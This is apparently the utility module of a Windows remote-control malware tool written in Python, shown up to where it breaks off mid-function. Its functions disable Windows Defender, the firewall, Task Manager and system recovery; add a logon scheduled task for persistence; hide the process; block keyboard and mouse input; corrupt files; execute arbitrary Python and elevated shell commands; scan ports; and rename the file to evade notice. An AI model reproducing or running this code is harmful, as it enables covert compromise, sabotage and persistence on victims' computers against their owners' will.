
# --- Utility Functions ---
# rev 2
import time
import ctypes
import sys
import os
import subprocess
import pyautogui
import requests
import socket
import numpy as np
import threading
import random
import math
import win32com
import keyboard
import string
from ctypes import *
import win32gui
from mark1_translate import translate as translator
from pynput import keyboard as pynput_keyboard
import win32process
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
try:
    import scapy.all
except Exception as e:
    print(f'Error: {e}')
import pyttsx3
import winsound
import pynput
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import sounddevice as sd
import win32api
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import psutil
import rotatescreen
import win32con
from gtts import gTTS
import pythoncom, pyWinhook
import win32comext.shell.shell as shell
from langdetect import detect
from random import randint
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import requests
from flask import *
from Crypto.Cipher import AES
import ast


# --- Global Variables ---
startup_START = time.time()
admin_privileges = not (ctypes.windll.shell32.IsUserAnAdmin() == 0)
mouse_idle = 0  
keyboard_idle = 0  
script_start = time.time()
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0
socket.setdefaulttimeout(None)
computerName = os.environ['COMPUTERNAME'] 
INTERNET = False  
last_successful_check = 0
CHECK_INTERVAL = 1  
TIMEOUT_THRESHOLD = 5 
computersusername = os.environ['username']
screen_width = win32api.GetSystemMetrics(0)
screen_height = win32api.GetSystemMetrics(1)
mouse_listener = pynput.mouse.Listener(suppress=True)
hm = None
last_keyboard_input_time = time.time()
last_mouse_input_time = time.time()

def slp(seconds):
    """Sleeps without using time.sleep(), preventing thread blocking.

    Args:
        seconds (int): The number of seconds to wait.
    """
    
    toWait = time.time() + seconds
    while time.time() < toWait:
        pass
    
    
    


def runfunctionvianame(name, *args, **kwargs):
    """Runs a function by its name from the current module.

    Args:
        name (str): The name of the function to run.
        *args: Variable length argument list for the function.
        **kwargs: Arbitrary keyword arguments for the function.

    Returns:
        None
    """
    try:
        func = getattr(sys.modules[__name__], name)
        if func:
            func(*args, **kwargs)
        else:
            print(f"No function named {name} found.")
    except Exception as e:
        print(f"Error running function {name}: {e}")
        
        

def disablekeyboard_threadtorun():
    """Disables keyboard input by setting a low-level keyboard hook."""
    global hm
    hm = pyWinhook.HookManager()
    hm.KeyAll = lambda event: False
    hm.HookKeyboard()
    pythoncom.PumpMessages()

def disable_keyboard():
    """Starts a thread to disable keyboard input."""
    global disablekeyboard_threadtorun_thread
    if not disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.start()

def enable_keyboard():
    """Stops the thread that disables keyboard input."""
    global hm, disablekeyboard_threadtorun_thread
    if disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.kill()
        hm.UnhookKeyboard()
        disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun)

def disable_mouse():
    """Starts the mouse listener to disable mouse input."""
    global mouse_listener
    if not mouse_listener.is_alive():
        mouse_listener.start()

def enable_mouse():
    """Stops the mouse listener and creates a new one."""
    global mouse_listener
    if mouse_listener.is_alive():
        mouse_listener.stop()
        mouse_listener = pynput.mouse.Listener(suppress=True)

def presskeys(inputGiven):
    """Presses and releases the specified keys.

    Args:
        inputGiven (str): The keys to press, e.g., "ctrl+c".
    """
    try:
        
        pyautogui.hotkey(inputGiven.split('+'))
    except Exception as e:
        print(f'Error pressing keys: {e}')

def writetext(text):
    """Types the specified text using the keyboard.

    Args:
        text (str): The text to type.
    """
    keyboard.write(text)

def check_if_string_encoded(text):
    """Returns True if the string is encoded in utf-8. Otherwise, returns False."""

    try:
        # Try to decode the string
        decoded_string = text.decode('utf-8')
    except (UnicodeDecodeError, AttributeError):
        # print('The string is not encoded in utf-8.')
        return False
    else:
        # print('The string is encoded in utf-8.')
        return True

def runcmd(cmd, suppress=False, retry=0):
    """Runs a command in the shell.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if not suppress:
                print("The command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')

def programVL2(cmd, suppress=False, retry=0):
    """Runs a command with administrator privileges.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
        if a['hInstApp'] > 32:
            if not suppress:
                print("The admin command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            return programVL2(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at programVL2, {e}, CMD:{cmd}')
        if 'The operation was canceled by the user.' in e.args:
            retry +=1
            return programVL2(cmd, suppress, retry)

def screenoff():
    """Turns off the screen."""
    win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2) 
    
    

def texttospeech(text):
    """Speaks the given text using text-to-speech."""
    pythoncom.CoInitialize()
    pyttsx3.init(driverName='sapi5')
    engine = pyttsx3.init()
    engine.setProperty('rate', 165)
    engine.setProperty('volume', 10)
    engine.say(f'<pitch middle="-15">{text}</pitch>')
    engine.runAndWait()
    pythoncom.CoInitialize()
    
    

def transalte(translatetext, toLang):
    """Translates the given text to the specified language.

    Args:
        translatetext (str): The text to translate.
        toLang (str): The target language code (e.g., 'ru', 'fr').

    Returns:
        str: The translated text.
    """
    translator_obj = translator(translatetext, dest=toLang, src='auto')
    translated_text = translator_obj.text
    return translated_text


def speak(text, lang):
    """Speaks the given text in the specified language using gTTS.

    Args:
        text (str): The text to speak.
        lang (str): The language code (e.g., 'en', 'ru').
    """
    try:
        filename = f"tmp{randint(0, 1024123)}files.mp3"
        filepath = get_script_directory() + '\\' + filename
        tts = gTTS(text=text, lang=lang)
        tts.save(filepath)
        pygame.mixer.init()
        pygame.mixer.music.load(filepath)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
        pygame.mixer.music.unload()
        os.remove(filepath)
    except Exception as e:
        print(f'Caught exception:\n{e}')

def mapLangDetect_gtts(lang):
    lang_mapping = {
        # note languages that are not supported are defaulted to en.
        'af': 'af',
        'ar': 'ar',
        'bg': 'bg',
        'bn': 'bn',
        'ca': 'ca',
        'cs': 'cs',
        'cy': 'en',  
        'da': 'da',
        'de': 'de',
        'el': 'el',
        'en': 'en',
        'es': 'es',
        'et': 'et',
        'fa': 'fa',
        'fi': 'fi',
        'fr': 'fr',
        'gu': 'gu',
        'he': 'iw', 
        'hi': 'hi',
        'hr': 'hr',
        'hu': 'hu',
        'id': 'id',
        'it': 'it',
        'ja': 'ja',
        'kn': 'kn',
        'ko': 'ko',
        'lt': 'lt',
        'lv': 'lv',
        'mk': 'mk',  
        'ml': 'ml',
        'mr': 'mr',
        'ne': 'ne',
        'nl': 'nl',
        'no': 'no',
        'pa': 'en', 
        'pl': 'pl',
        'pt': 'pt',
        'ro': 'ro',
        'ru': 'ru',
        'sk': 'sk',
        'sl': 'en',  
        'so': 'en',  
        'sq': 'sq',
        'sv': 'sv',
        'sw': 'sw',
        'ta': 'ta',
        'te': 'te',
        'th': 'th',
        'tl': 'tl',
        'tr': 'tr',
        'uk': 'uk',
        'ur': 'ur',
        'vi': 'vi',
        'zh-cn': 'zh-CN',
        'zh-tw': 'zh-TW'
    }
    return lang_mapping.get(lang, 'en')

def detectLang(text):
    """Detects the language of the given text.

    Args:
        text (str): The text to analyze.

    Returns:
        str: The language code (e.g., 'en', 'ru').
    """
    try:
        return mapLangDetect_gtts(detect(str(text)))
    except Exception as e:
        print(e)


def speakXlanguage(text):
    """Detects the language of the text and speaks it accordingly."""
    speak(text, detectLang(text))
    
    


def check_internet():
    global INTERNET, last_successful_check
    sites_to_check = [
        "https://www.google.com",
        "https://www.cloudflare.com",
        "https://www.amazon.com"
    ]
    
    for site in sites_to_check:
        try:
            response = requests.get(site, timeout=2)
            if response.status_code == 200:
                INTERNET = True
                last_successful_check = time.time()
                # print(f'Internet connection detected (connected to {site})')
                return
        except requests.RequestException:
            continue
    
    # If we've reached this point, all checks failed
    if time.time() - last_successful_check > TIMEOUT_THRESHOLD:
        INTERNET = False
        print("Internet connection lost")

def internet_check_loop():
    while True:
        check_internet()
        time.sleep(CHECK_INTERVAL)


def start_internet_check():
    threading.Thread(target=internet_check_loop, daemon=True).start()

start_internet_check()



class KThread(threading.Thread):
    """A subclass of threading.Thread that can be killed."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Starts the thread."""
        self.__run_backup = self.run
        self.run = self.__run            
        threading.Thread.start(self)

    def __run(self):
        """Installs a trace for killing the thread."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        """Sets the killed flag to True."""
        self.killed = True

disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun) # Needs to be here due to definition errors



def add_to_list_if_not_in(item, lst: list):
    """Adds an item to a list if it's not already present."""
    if item not in lst:
        lst.append(item) 
        
        

def scan_ports(ip_to_scan):
    """Scans a range of ports on a given IP address.

    Args:
        ip_to_scan (str): The IP address to scan.

    Returns:
        list: A list of open ports.
    """
    devices = []    

    def port(port_name):
        """Scans a single port on the given IP address."""
        socket.setdefaulttimeout(0.7)
        result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip_to_scan, port_name))
        if result == 0:
            print(f'The port {port_name} is successful for ip {ip_to_scan}')
            devices.append(f'{ip_to_scan}:{port_name}')

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip:
        for i in range(1,255):
            executorofscanip.submit(port, i)
            
    print(devices, f"for {ip_to_scan}")
    return devices



def protect_file(file_path):
    """Protects a file by setting permissions and attributes.

    Args:
        file_path (str): The path to the file to protect.
    """
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r {os.environ["username"]}:F /deny "*":RX')
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    programVL2(f'icacls "{file_path}" /deny {os.getlogin()}:W,D')
    programVL2(f'attrib +r +h +s "{file_path}"')
    programVL2(f'attrib +r "{file_path}"')
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    programVL2(f'icacls "{file_path}" /disable')

def disableresetoptions():
    """Disables various system reset options in Windows."""
    programVL2('reagentc.exe /disable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 1 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled no')
    programVL2(r'bcdedit /set {default} bootmenupolicy legacy')
    programVL2('takeown /f ReAgentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\ReAgentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im ReAgentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\ReAgentc.exe" tmpreagentc.exe')
    
def enableresetoptions():
    """Enables various system reset options in Windows."""
    programVL2('reagentc.exe /enable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 0 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled yes')
    programVL2('takeown /f tmpreagentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\tmpreagentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im tmpreagentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\tmpreagentc.exe" ReAgentc.exe')

def DisableWindowsDefender():
    """Disables various components of Windows Defender."""
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f')
        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f')
    except Exception as e: 
        print(e)
        return False
    
def EnableWindowsDefender():
    """Enables various components of Windows Defender."""
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
    except Exception as e: 
        print(e)
        return False


def disableresetoptions():
    """Disables various system reset options in Windows."""
    programVL2('reagentc.exe /disable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 1 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled no')
    programVL2(r'bcdedit /set {default} bootmenupolicy legacy')
    programVL2('takeown /f ReAgentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\ReAgentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im ReAgentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\ReAgentc.exe" tmpreagentc.exe')
    
def enableresetoptions():
    """Enables various system reset options in Windows."""
    programVL2('reagentc.exe /enable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 0 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled yes')
    programVL2('takeown /f tmpreagentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\tmpreagentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im tmpreagentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\tmpreagentc.exe" ReAgentc.exe')


def play_tone(frequency, duration):
    """Plays a tone at the specified frequency and duration.

    Args:
        frequency (int): The frequency of the tone in Hertz.
        duration (int): The duration of the tone in milliseconds.
    """
    print(f'Playing {frequency}hz for a duration of {duration}')
    winsound.Beep(frequency, duration)
    
def play_shepard_tone(start_hz, end_hz, duration):
    """Plays a Shepard tone."""
    samples_per_second = 44100
    t = np.linspace(0, duration, int(samples_per_second * duration), False)
    f = start_hz * np.power(end_hz/start_hz, t/duration)
    wave = 0.5 * np.sin(2*np.pi*f*t)
    info = sd.query_devices()
    device_id = None
    for i, device in enumerate(info):
        if device['max_output_channels'] > 0:
            device_id = i
            break
    if device_id is not None:
        sd.play(wave, samples_per_second, device=device_id)
        sd.wait()
    else:
        print('No available output device found')
        

def get_host_ip():
    return socket.gethostbyname(socket.gethostname())

def decrypt_msg(msg_bytes, key=b'\x12\x1f...\xae'):  # Your actual key should be here
    """Decrypts a message.  Handles decryption/authentication failures gracefully."""

    def decrypt(key, ciphertext):
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)  # Combined decrypt and verify
            return plaintext
        except (ValueError, Exception) as e:  # Catch both decryption and other errors
            print(f"Decryption or verification failed: {e}")
            return None  # Return None upon failure


    try:
        msg = ast.literal_eval(msg_bytes.decode('utf-8', errors='replace'))
        plaintext = decrypt(key, msg)
        return plaintext  # Return bytes or None (for failure)

    except Exception as e:
        print(f"Error during decryption process: {e}")
        return None



def encrypt_msg(msg, key=b'\x12\x1f...\xae'): # Expects either str or bytes
    """Encrypts a message using AES."""

    def encrypt(key, plaintext_bytes): # Expects bytes
        """Encrypts the plaintext using AES."""
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext_bytes)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error during encryption: {e}')
            return None

    try:
        if isinstance(msg, str):
            msg_bytes = msg.encode('utf-8')  # Encode only if it's a string
        elif isinstance(msg, bytes):
            msg_bytes = msg # Already bytes, do nothing
        else:
            raise TypeError("msg must be string or bytes")

        encrypted_data = encrypt(key, msg_bytes)
        if encrypted_data:
            return str(encrypted_data).encode('utf-8')  # Encode the tuple representation
        else:
            return False  # Encryption failed
    except Exception as e:
        print(f'Error during encryption process: {e}')
        return False

def find_window(search_term):
    def callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                if (search_term.lower() in window_title.lower() or 
                    search_term.lower() in process.name().lower()):
                    windows.append(hwnd)
            except psutil.NoSuchProcess:
                pass
        return True
    windows = []
    win32gui.EnumWindows(callback, windows)
    return windows

def bring_window_to_foreground(search_term):
    windows = find_window(search_term)
    if windows:
        hwnd = windows[0]  # Use the first matching window
        shell = win32com.client.Dispatch("WScript.Shell")
        shell.SendKeys('%')  # Alt key to activate the window
        win32gui.SetForegroundWindow(hwnd)
        print(f"Brought window matching '{search_term}' to foreground")
    else:
        print(f"No visible window found matching '{search_term}'")

def makethescreendorotations(duration):
    """Rotates the screen continuously for a specified duration."""
    duration = int(duration)
    screen = rotatescreen.get_primary_display()
    start_pos = screen.current_orientation
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        i += 1
        pos = abs((start_pos - i * 90) % 360)
        screen.rotate_to(pos)
        slp(0.7)
    screen.set_landscape()

def flipscreen():
    """Flips the screen upside down."""
    for i in rotatescreen.get_displays():
        i.set_landscape_flipped()

def screenlandscape():
    """Sets the screen orientation to landscape."""
    for i in rotatescreen.get_displays():
        i.set_landscape()

def screenportrait():
    """Sets the screen orientation to portrait (left)."""
    for i in rotatescreen.get_displays():
        i.set_portrait()

def screenportraitflipped():
    """Sets the screen orientation to portrait flipped (right)."""
    for i in rotatescreen.get_displays():
        i.set_portrait_flipped()
        
        
def restartToUAC():
    """Restarts the script with UAC privileges if not already running as admin."""
    if not admin_privileges:
        print('Restarting to obtain UAC perms')
        programVL2(f'start {os.path.join(get_script_directory(), get_script_filename())}')
        kill_self()
    else:
        print('Already have UAC perms, no need in a restart')
        
def addselftostartup_reg():
    """Adds the script to the Windows registry to run on startup (requires admin rights)."""
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        os.rmdir(startup_folder)
    except:
        pass
    programVL2(f'schtasks /create /sc ONLOGON /tn "vtl" /tr "{os.path.join(get_script_directory(), get_script_filename())}" /ru {os.getlogin()} /rl HIGHEST /it /f')



def swaprmbandlmbtrue():
    """Swaps the left and right mouse buttons."""
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(True)

def unswaprmbandlmb():
    """Unswaps the left and right mouse buttons."""
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(False)
    
def webhandler(website):
    """Opens a website in the default browser."""
    runcmd(f'start chrome "{website}"')
    
    
def get_script_directory():
    """Gets the directory where the script is located."""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def get_script_filename():
    """Gets the filename of the script."""
    if getattr(sys, 'frozen', False):
        return os.path.basename(sys.executable)
    else:
        return os.path.basename(__file__)


def hide_self_ui():
    """Hides the script's UI from the user."""
    [hide_process_via_pid(i) for i in get_process_connected_pids(os.getpid())]
    
def get_process_connected_pids(pid):
    """Gets a list of PIDs related to a given process, including parent and children."""
    proc = psutil.Process(pid)
    parent = proc.parent()
    ppid = parent.pid if parent is not None else None
    children = proc.children()
    child_pids = [child.pid for child in children]
    all_pids = [pid]
    if ppid is not None:
        all_pids.append(ppid)
    all_pids.extend(child_pids)
    return all_pids

def restart_explorer():
    """Restarts Windows Explorer."""
    runcmd("taskkill /f /im explorer.exe")
    runcmd("explorer.exe", retry=4)
    

def get_username_os():
    """Gets the username of the current user."""
    return os.getlogin()

def get_random_folder():
    """Gets a random folder from a list of possible locations."""
    if admin_privileges:
        folders = [
            "C:\ProgramData",
            "C:\Windows",
            "C:\Windows\System32"
        ]
    else:
        username = get_username_os()
        folders = [
            f"C:\\Users\\{username}\\AppData\\Local",
            f"C:\\Users\\{username}\\AppData\\LocalLow",
            f"C:\\Users\\{username}\\AppData\\Roaming",
            f"C:\\Users\\{username}\\Documents"
        ]
    all_folders = []
    for i in folders:
        for x in os.listdir(i):
            if not x.startswith('.') and not x.endswith('.ini'): # To avoid hidden folders and .ini files
                all_folders.append(os.path.join(i, x))
    all_actual_folders = [i for i in all_folders if os.path.isdir(i) and " " not in i]
    if all_actual_folders:
        chosen = random.choice(all_actual_folders)
        return chosen
    else:
        print("No suitable folders found in the specified directories.")
        return None
    
def isIn(name, list): 
    """Checks if a string is present in a list of strings."""
    return any(name.lower() in i.lower() for i in list)


def kill_self():
    """Kills the script and all its related processes."""
    [runcmd(f'taskkill /f /t /PID {i}') for i in get_process_connected_pids(os.getppid())]
    runcmd(f'taskkill /f /t /PID {os.getpid()}')

def reset_network():
    """Resets the network settings."""
    runcmd('ipconfig /release')
    runcmd('ipconfig /renew')
    runcmd('ipconfig /flushdns')
    runcmd('netsh winsock reset')
    runcmd('netsh int ip reset')
    runcmd('netsh advfirewall reset')
    runcmd('netsh firewall reset')
    runcmd('netsh int tcp set heuristics disabled')
    runcmd('netsh int tcp set global autotuninglevel=normal')
    runcmd('netsh int tcp set global rss=enabled')
    runcmd('netsh int tcp show global')

def disablefirewall():
    """Disables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state off', True)
    runcmd('netsh firewall set notifications mode=disable profile=all', True)

def bypassfirewall():
    """Bypasses the firewall for the script."""
    exe_path = os.path.join(get_script_directory(), get_script_filename())
    cmd = f'netsh advfirewall firewall add rule name="x32dbg" dir=in action=allow program="{exe_path}" enable=yes'
    programVL2(cmd)

def enablefirewall():
    """Enables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state on', True)
    

def disableTaskmanager():
    """Disables the Windows Task Manager."""
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def enabletaskmgr():
    """Enables the Windows Task Manager."""
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')

def runpythonscript(text):
    """Executes Python code from a string."""
    try:
        exec(text)
        print('Succesfully ran code')
    except Exception as e:
        print(f'Error while running python code:\n{e}')
        return e


def corruptfile(directoryoffile):
    """Corrupts a file by overwriting its content."""
    with open(directoryoffile, "w+") as f:
        f.seek(0)
        content = f.read()
        scrubbed_content = b"X" * len(content)
        f.seek(0)
        f.write(scrubbed_content)
        f.truncate()
        
def procKill(name):
    """Kills a process by its name."""
    if '.' not in name:
        name += ".exe"
    try:
        runcmd('taskkill /f /im ' + name)
    except:
        pass
    
    
def set_volume(volume):
    """Sets the system volume."""
    pythoncom.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volumeInterface = cast(interface, POINTER(IAudioEndpointVolume))
    newVolume = max(0.0, min(1.0, float(volume) / 100.0))
    volumeInterface.SetMasterVolumeLevelScalar(newVolume, None)
    pythoncom.CoInitialize()
    
    
def find_file_with_string(search_string):
    """Finds a file containing a specific string in its name."""
    with os.scandir('.') as entries:
        for entry in entries:
            if entry.is_file() and search_string in entry.name:
                return True, os.path.abspath(entry)
    return False, None


def renameSELF(ToWhat):
    """Renames the script file."""
    extension = get_script_filename().split(".")[-1]
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    if "." not in ToWhat:
        ToWhat = ToWhat + "." + extension    
    if ToWhat == get_script_filename():
        return "Given name is already set to Filename"
    ToWhat_FileNameOnly = os.path.basename(ToWhat)
    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
ren "{os.path.join(get_script_directory(), get_script_filename())}" "{ToWhat_FileNameOnly}"
"{os.path.join(get_script_directory(), ToWhat)}" delFile "{os.path.join(get_script_directory(), random_string)}" ren"
    """
    screenoff()
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
